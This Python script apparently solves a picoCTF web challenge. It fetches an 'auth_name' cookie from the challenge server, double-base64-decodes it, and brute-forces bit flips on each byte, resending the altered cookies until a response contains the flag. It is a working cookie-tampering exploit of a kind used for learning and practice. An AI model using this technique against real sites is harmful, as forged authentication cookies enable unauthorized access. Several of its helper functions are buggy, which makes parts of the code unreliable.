from tabnanny import check
from base64 import b64decode, b64encode
import requests

def convertStringToBinary(message) -> str:
    return ''.join(format(ord(i), '08b') for i in message)

def convertBinaryToString() -> str:
    binary_int = int("11000010110001001100011", 2);
    # Getting the byte number
    byte_number = binary_int.bit_length() + 7 // 8
    # Getting an array of bytes
    binary_array = binary_int.to_bytes(byte_number, "big")
    # Converting the array into ASCII text
    ascii_text = binary_array.decode()
    return ascii_text

def getWebsiteSession():
    s = requests.session()
    s.get("http://mercury.picoctf.net:56136/")
    authCookie = s.cookies["auth_name"]
    breakEncryption3(authCookie)

def checkWebsiteWithNewCookie(newCookie):
    cookies = {'auth_name': newCookie}
    r = requests.get("http://mercury.picoctf.net:56136/", cookies=cookies)
    return r

def checkIfWrongCookie(r: requests.Response):
    return "picoCTF{" in r.text

def breakEncryption(encodedStr: str):
    message = b64decode(b64decode(encodedStr).decode())
    messageArray = bytearray(message)  # Make byte array to make it mutable

    for count, i in enumerate(messageArray):
        
        binaryString = bin(i)[2:]  # Get rid of 0b at the start of the string
        binaryString = binaryString.zfill(7)  # Pad the start so all strings are 7
        bitFlip = 0b1000000
        for j in range(7):
            tempArray = messageArray[:]
            bitFlipped = i ^ bitFlip  # xor, basically turns 1s to 0s, and 0s to 1s
            bitFlip = bitFlip >> 1
            i = bitFlipped
            tempArray[count] = i
            please = b64encode(b64encode(bytes(tempArray))).decode()
            r = checkWebsiteWithNewCookie(please)
            if checkIfWrongCookie(r):
                print("Something was broken")
                print(r.text)
                input("Press Enter to continue...")

def getCookie():
    s = requests.session()
    s.get("http://mercury.picoctf.net:56136/")
    return s.cookies['auth_name']
    
def breakEncryption2(encodedStr: str):
    for i in range(128):
        authName = bytearray(b64decode(b64decode(getCookie())))
        binaryString = bin(authName[i])[2:]  # Get rid of 0b at the start of the string
        binaryString = binaryString.zfill(7)  # Pad the start so all strings are 7
        bitFlip = 0b1000000
        for j in range(7):
            tempArray = authName[:]
            bitFlipped = authName[i] ^ bitFlip  # xor, basically turns 1s to 0s, and 0s to 1s
            bitFlip = bitFlip >> 1
            authName[i] = bitFlipped
            please = b64encode(b64encode(bytes(authName[i])))
            r = checkWebsiteWithNewCookie(please)
            if checkIfWrongCookie(r):
                print("Something was broken")
                print(r.text)
                input("Press Enter to continue...")

def bit_flip(pos, bit, data):
    # raw = b64decode(b64decode(data).decode())
    # list1 = bytearray(raw)
    print(f"Before:   {bin(data[pos])}")
    print(f"Bit flip: {bin(bit)}")
    data[pos] = data[pos] ^ bit
    print(f"After:    {bin(data[pos])}")
    raw = bytes(data)
    return b64encode(b64encode(raw)).decode()

def breakEncryption3(encodedStr: str):
    print(f"Using encoded cookie {encodedStr}")
    message = b64decode(b64decode(encodedStr))
    messageArray = bytearray(message)  # Make byte array to make it mutable

    for count, i in enumerate(messageArray):
        print("Starting byte flip on {i} index {count}")
        binaryString = bin(i)[2:]  # Get rid of 0b at the start of the string
        binaryString = binaryString.zfill(7)  # Pad the start so all strings are 7
        bitFlip = 0b10000000
        
        for j in range(8):
            newCookie = bit_flip(count, bitFlip, messageArray[:])
            bitFlip = bitFlip >> 1
            r = checkWebsiteWithNewCookie(newCookie)
            if "picoCTF{" in r.text:
                print("Something was broken")
                print(r.text)
                input("Press Enter to continue...")
            else:
                print(f"On request {count + (j + 1)}")
        print("Next Byte")

getWebsiteSession()